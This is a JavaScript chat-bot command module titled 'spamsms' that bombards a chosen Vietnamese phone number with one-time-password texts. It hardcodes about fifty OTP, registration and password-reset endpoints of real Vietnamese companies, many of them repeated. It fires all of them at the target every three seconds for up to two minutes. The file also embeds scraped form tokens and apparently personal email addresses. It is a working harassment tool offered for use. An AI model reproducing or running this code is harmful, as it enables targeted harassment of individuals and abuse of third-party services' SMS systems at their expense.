const axios = require("axios");
const fs = require("fs");
const path = require("path");
const chalk = require("chalk");

module.exports.config = {
    name: "spamsms",
    version: "1.2.0",
    hasPermission: 1,
    credits: "Nguyễn Trương Thiện Phát (Pcoder)",
    description: "Spam SMS OTP trực tiếp",
    commandCategory: "Tiện ích",
    usages: "/spamsms {sdt} {time}",
    cooldowns: 5
};

async function sendOtp(phone) {
    const services = [
        {
            name: "tv360",
            url: "https://m.tv360.vn/public/v1/auth/get-otp-login",
            method: "POST",
            data: { msisdn: phone },
            headers: { "Content-Type": "application/json" }
        },
        {
            name: "vietloan",
            url: "https://vietloan.vn/register/phone-resend",
            method: "POST",
            data: `phone=${phone}&_token=0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU`,
            headers: { "Content-Type": "application/x-www-form-urlencoded" }
        },
        {
            name: "batdongsan",
            url: "https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister",
            method: "GET",
            params: { phoneNumber: phone }
        },
        {
            name: "viettel",
            url: "https://viettel.vn/api/get-otp",
            method: "POST",
            data: { msisdn: phone },
            headers: { "Content-Type": "application/json" }
        },
        {
            name: "fptshop",
            url: "https://papi.fptshop.com.vn/gw/is/user/new-send-verification",
            method: "POST",
            data: { fromSys: "WEBKHICT", otpType: "0", phoneNumber: phone },
            headers: { "Content-Type": "application/json" }
        },
        {
            name: "meta",
            url: "https://meta.vn/app_scripts/pages/AccountReact.aspx",
            method: "POST",
            data: { api_args: { lgUser: phone, type: "phone" }, api_method: "CheckRegister" },
            headers: { "Content-Type": "application/json" }
        },
        {
            name: "dienmayxanh",
            url: "https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
            method: "POST",
            data: `phoneNumber=${phone}&isReSend=false&sendOTPType=1`,
            headers: { "Content-Type": "application/x-www-form-urlencoded" }
        },
         {
            name: "medicare",
            url: "https://medicare.vn/api/otp",
            method: "POST",
            data: { mobile: phone, mobile_country_prefix: "84" },
            headers: { "Content-Type": "application/json", "Referer": "https://medicare.vn/login" }
        },
        {
            name: "acfc",
            url: "https://www.acfc.com.vn/mgn_customer/customer/sendOTP",
            method: "POST",
            data: `number_phone=${phone}&form_key=z6U4dNbxwcokMy9u&currentUrl=https://www.acfc.com.vn/customer/account/create/`,
            headers: { "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://www.acfc.com.vn/customer/account/create/" }
        },
        {
            name: "lotte",
            url: "https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp",
            method: "POST",
            data: { username: phone, case: "register" },
            headers: { "Content-Type": "application/json", "Referer": "https://www.lottemart.vn/signup" }
        },
        {
            name: "dominos",
            url: "https://dominos.vn/api/v1/users/send-otp",
            method: "POST",
            data: { phone_number: phone, email: "nguyentrongkhai130@gmail.com", type: 0, is_register: true },
            headers: { "Content-Type": "application/json", "Referer": "https://dominos.vn/" }
        },
        {
            name: "faceshop",
            url: "https://tfs-api.hsv-tech.io/client/phone-verification/request-verification",
            method: "POST",
            data: { phoneNumber: phone },
            headers: { "Content-Type": "application/json", "Referer": "https://thefaceshop.com.vn/" }
        },
        {
            name: "futabus",
            url: "https://futabus.vn/api/v1/auth/send-otp",
            method: "POST",
            data: { phoneNumber: phone, deviceId: "e3025fb7-5436-4002-9950-e6564b3656a6", use_for: "LOGIN" },
            headers: { "Content-Type": "application/json", "Referer": "https://futabus.vn/" }
        },
        {
            name: "onelife",
            url: "https://api.onelife.vn/v1/gateway/",
            method: "POST",
            data: { phone: phone },
            headers: { "Content-Type": "application/json" }
        },
        {
            name: "medpro",
            url: "https://api-v2.medpro.com.vn/user/phone-register",
            method: "POST",
            data: { fullname: "người dùng medpro", deviceId: "401387b523eda9fc5998c36541400134", phone: phone, type: "password" },
            headers: { "Content-Type": "application/json", "Referer": "https://id-v121.medpro.com.vn/" }
        },
        {
            name: "ghn",
            url: "https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp",
            method: "POST",
            data: { phone: phone, type: "register" },
            headers: { "Content-Type": "application/json", "Referer": "https://sso.ghn.vn/" }
        },
        {
            name: "shopiness",
            url: "https://shopiness.vn/ajax/user",
            method: "POST",
            data: `action=verify-registration-info&phoneNumber=${phone}&refCode=`,
            headers: { "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://shopiness.vn/" }
        },
        {
            name: "galaxyplay",
            url: "https://api.glxplay.io/account/phone/verify",
            method: "POST",
            params: { phone: phone },
            headers: { "Content-Type": "application/json", "Referer": "https://galaxyplay.vn/" }
        },
        {
            name: "ahamove",
            url: "https://api.ahamove.com/api/v3/public/user/register",
            method: "POST",
            data: {
                mobile: phone, name: "khải", email: "khaissn@gmail.com",
                country_code: "VN", firebase_sms_auth: "true", time: Date.now(),
                checksum: "Ux7gAkb+yFErrq5SsmdmJ8KE31qEen0z..."
            },
            headers: { "Content-Type": "application/json", "Referer": "https://app.ahamove.com/" }
        },
        {
            name: "longchau",
            url: "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
            method: "POST",
            data: { phoneNumber: phone, otpType: 0, fromSys: "WEBKHLC" },
            headers: { "Content-Type": "application/json", "Referer": "https://nhathuoclongchau.com.vn/" }
        },
        {
            name: "medicare",
            url: "https://medicare.vn/api/sendOtp",
            method: "POST",
            data: { mobile: phone, mobile_country_prefix: "84" },
            headers: { "Content-Type": "application/json", "Referer": "https://medicare.vn/login" }
        },
        {
            name: "moneyveo",
            url: "https://moneyveo.vn/vi/registernew/sendsmsjson/",
            method: "POST",
            data: `phoneNumber=${phone}`,
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "https://moneyveo.vn/vi/registernew/"
            }
        },
        {
            name: "winmart",
            url: "https://api-crownx.winmart.vn/iam/api/v1/user/register",
            method: "POST",
            data: { firstName: "Taylor Jasmine", phoneNumber: phone, masanReferralCode: "", dobDate: "2005-08-05", gender: "Male" },
            headers: {
                "Content-Type": "application/json",
                "Referer": "https://winmart.vn/"
            }
        },
        {
            name: "alfrescos",
            url: "https://api.alfrescos.com.vn/api/v1/User/SendSms",
            method: "POST",
            params: { culture: "vi-VN" },
            data: { phoneNumber: phone, secureHash: "ebe2ae8a21608e1afa1dbb84e944dc89", deviceId: "", sendTime: Date.now(), type: 1 },
            headers: {
                "Content-Type": "application/json",
                "Referer": "https://alfrescos.com.vn/"
            }
        },
        {
            name: "phuclong",
            url: "https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd",
            method: "POST",
            data: { userName: phone },
            headers: {
                "Content-Type": "application/json",
                "Referer": "https://order.phuclong.com.vn/"
            }
        },
        {
            name: "emart",
            url: "https://emartmall.com.vn/index.php?route=account/register/smsRegister",
            method: "POST",
            data: `mobile=${phone}`,
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "https://emartmall.com.vn/index.php?route=account/register"
            }
        },
        {
            name: "hana",
            url: "https://api.vayvnd.vn/v2/users/password-reset",
            method: "POST",
            data: { login: phone, trackingId: "8Y6vKPEgdnxhamRfAJw7IrW3nwVYJ6BHzIdygaPd1S9urrRIVnFibuYY0udN46Z3" },
            headers: {
                "Content-Type": "application/json",
                "Referer": "https://vayvnd.vn/"
            }
        },
        {
            name: "kingfoodmart",
            url: "https://kingfoodmart.com/graphql",
            method: "POST",
            data: {
                operationName: "SendOTP",
                variables: { phone: phone },
                query: `mutation SendOTP($phone: String!) { sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) { otpTrackingId __typename } }`
            },
            headers: {
                "Content-Type": "application/json",
                "Referer": "https://kingfoodmart.com/"
            }
        },
        {
            name: "mocha",
            url: "https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp",
            method: "POST",
            params: { msisdn: phone, languageCode: "vi" },
            headers: {
                "Accept": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
            }
        },
        {
            name: "fptshop",
            url: "https://papi.fptshop.com.vn/gw/is/user/new-send-verification",
            method: "POST",
            data: { fromSys: "WEBKHICT", otpType: "0", phoneNumber: phone },
            headers: {
                "Content-Type": "application/json",
                "Referer": "https://fptshop.com.vn/"
            }
        },
        {
            name: "meta",
            url: "https://meta.vn/app_scripts/pages/AccountReact.aspx",
            method: "POST",
            params: { api_mode: "1" },
            data: { api_args: { lgUser: phone, type: "phone" }, api_method: "CheckRegister" },
            headers: {
                "Content-Type": "application/json",
                "Referer": "https://meta.vn/account/register"
            }
        },
        {
            name: "dienmayxanh",
            url: "https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
            method: "POST",
            data: { phoneNumber: phone, isReSend: "false", sendOTPType: "1" },
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap"
            }
        },
        {
            name: "tgdt",
            url: "https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
            method: "POST",
            data: { phoneNumber: phone, isReSend: "false", sendOTPType: "1" },
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "https://www.thegioididong.com/lich-su-mua-hang/dang-nhap"
            }
        },
        {
            name: "concung",
            url: "https://www.concung.com/khach-hang/dang-nhap",
            method: "POST",
            data: { phone: phone },
            headers: {
                "Content-Type": "application/json",
                "Referer": "https://www.concung.com/"
            }
        },
        {
            name: "tv360",
            url: "https://m.tv360.vn/public/v1/auth/get-otp-login",
            method: "POST",
            data: { msisdn: phone },
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A)"
            }
        },
        {
            name: "vietloan",
            url: "https://vietloan.vn/register/phone-resend",
            method: "POST",
            data: `phone=${phone}&_token=0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU`,
            headers: { "Content-Type": "application/x-www-form-urlencoded" }
        },
        {
            name: "batdongsan",
            url: "https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister",
            method: "GET",
            params: { phoneNumber: phone },
            headers: { "Accept": "application/json, text/plain, */*" }
        },
        {
            name: "viettel",
            url: "https://viettel.vn/api/get-otp",
            method: "POST",
            data: { msisdn: phone },
            headers: { "Content-Type": "application/json" }
        },
        {
            name: "viettel-login",
            url: "https://viettel.vn/api/get-otp-login",
            method: "POST",
            data: { phone: phone, type: "" },
            headers: { "Content-Type": "application/json" }
        },
        {
            name: "pharmacity",
            url: "https://api-gateway.pharmacity.vn/customers/register/otp",
            method: "POST",
            data: { phone: phone, referral: "" },
            headers: { "Content-Type": "application/json" }
        },
        {
            name: "mocha",
            url: "https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp",
            method: "POST",
            params: { msisdn: phone, languageCode: "vi" },
            headers: { "Content-Type": "application/json" }
        },
        {
            name: "tv360",
            url: "https://m.tv360.vn/public/v1/auth/get-otp-login",
            method: "POST",
            data: { msisdn: phone },
            headers: { "Content-Type": "application/json" }
        },
        {
            name: "vietloan",
            url: "https://vietloan.vn/register/phone-resend",
            method: "POST",
            data: `phone=${phone}&_token=0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU`,
            headers: { "Content-Type": "application/x-www-form-urlencoded" }
        },
        {
            name: "batdongsan",
            url: "https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister",
            method: "GET",
            params: { phoneNumber: phone }
        },
        {
            name: "viettel",
            url: "https://viettel.vn/api/get-otp",
            method: "POST",
            data: { msisdn: phone },
            headers: { "Content-Type": "application/json" }
        },
        {
            name: "fptshop",
            url: "https://papi.fptshop.com.vn/gw/is/user/new-send-verification",
            method: "POST",
            data: { fromSys: "WEBKHICT", otpType: "0", phoneNumber: phone },
            headers: { "Content-Type": "application/json" }
        },
        {
            name: "meta",
            url: "https://meta.vn/app_scripts/pages/AccountReact.aspx",
            method: "POST",
            data: { api_args: { lgUser: phone, type: "phone" }, api_method: "CheckRegister" },
            headers: { "Content-Type": "application/json" }
        },
        {
            name: "dienmayxanh",
            url: "https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
            method: "POST",
            data: `phoneNumber=${phone}&isReSend=false&sendOTPType=1`,
            headers: { "Content-Type": "application/x-www-form-urlencoded" }
        },
        {
            name: "tgdt",
            url: "https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
            method: "POST",
            data: `phoneNumber=${phone}&isReSend=false&sendOTPType=1`,
            headers: { "Content-Type": "application/x-www-form-urlencoded" }
        },
        {
            name: "pharmacity",
            url: "https://api-gateway.pharmacity.vn/customers/register/otp",
            method: "POST",
            data: { phone: phone, referral: "" },
            headers: { "Content-Type": "application/json" }
        },
        {
            name: "mocha",
            url: "https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp",
            method: "POST",
            params: { msisdn: phone, languageCode: "vi" },
            headers: { "Content-Type": "application/json" }
        },
        {
            name: "dienmayxanh",
            url: "https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
            method: "POST",
            data: `phoneNumber=${phone}&isReSend=false&sendOTPType=1`,
            headers: { "Content-Type": "application/x-www-form-urlencoded" }
        }
    ];

    return await Promise.allSettled(
        services.map(async (service) => {
            try {
                const response = await axios({
                    method: service.method,
                    url: service.url,
                    data: service.data || null,
                    headers: service.headers || {}
                });
                return { service: service.name, status: "Success", response: response.data };
            } catch (error) {
                return { service: service.name, status: "Failed", error: error.message };
            }
        })
    );
}

module.exports.run = async function ({ api, event, args }) {
    const { threadID, messageID } = event;
    if (args.length < 2) {
        return api.sendMessage("❌ Vui lòng nhập đúng cú pháp: /spamsms {sdt} {time}", threadID, messageID);
    }

    const sdt = args[0];
    const time = parseInt(args[1]);

    if (!/^\d{10}$/.test(sdt)) {
        return api.sendMessage("❌ Số điện thoại không hợp lệ, vui lòng nhập 10 số!", threadID, messageID);
    }

    if (isNaN(time) || time > 120) {
        return api.sendMessage("❌ Thời gian không hợp lệ (tối đa 120 giây)!", threadID, messageID);
    }

    const imageURL = "https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExY2dnZnJrdzZlZDF0bzlvdDdrdWYxYzc3eHk5eTVnajNsbzBjbXJjMCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/CY3A9zOlZR8uhFbeok/giphy.gif";
    const imagePath = path.join(__dirname, "cache/spamsms.gif");

    try {
        if (!fs.existsSync(imagePath)) {
            await downloadImage(imageURL, imagePath);
        }

        api.sendMessage({
            body: `🔄 Đang gửi OTP đến ${sdt} trong ${time}s...`,
            attachment: fs.createReadStream(imagePath)
        }, threadID, async () => {
            console.log(`Bắt đầu spam OTP cho ${chalk.green(sdt)} trong ${chalk.yellow(time + "s" )}...`);
            let startTime = Date.now();

            const interval = setInterval(async () => {
                if (Date.now() - startTime >= time * 1000) {
                    clearInterval(interval);
                    console.log(`✅ Hoàn tất spam OTP cho ${sdt} sau ${time}s.`);
                    api.sendMessage(`✅ Đã hoàn tất gửi OTP cho ${sdt} sau ${time}s.`, threadID, messageID);
                    return;
                }
                let batchResults = await sendOtp(sdt);
                console.log(`📨 Đã gửi một vòng OTP cho ${sdt}.`);
            }, 3000);
        }, messageID);
    } catch (err) {
        console.error(err);
        api.sendMessage("❌ Lỗi tải ảnh hoặc gửi OTP!", threadID, messageID);
    }
};

async function downloadImage(url, outputPath) {
    const response = await axios({
        url,
        responseType: "stream"
    });
    return new Promise((resolve, reject) => {
        const writer = fs.createWriteStream(outputPath);
        response.data.pipe(writer);
        writer.on("finish", resolve);
        writer.on("error", reject);
    });
}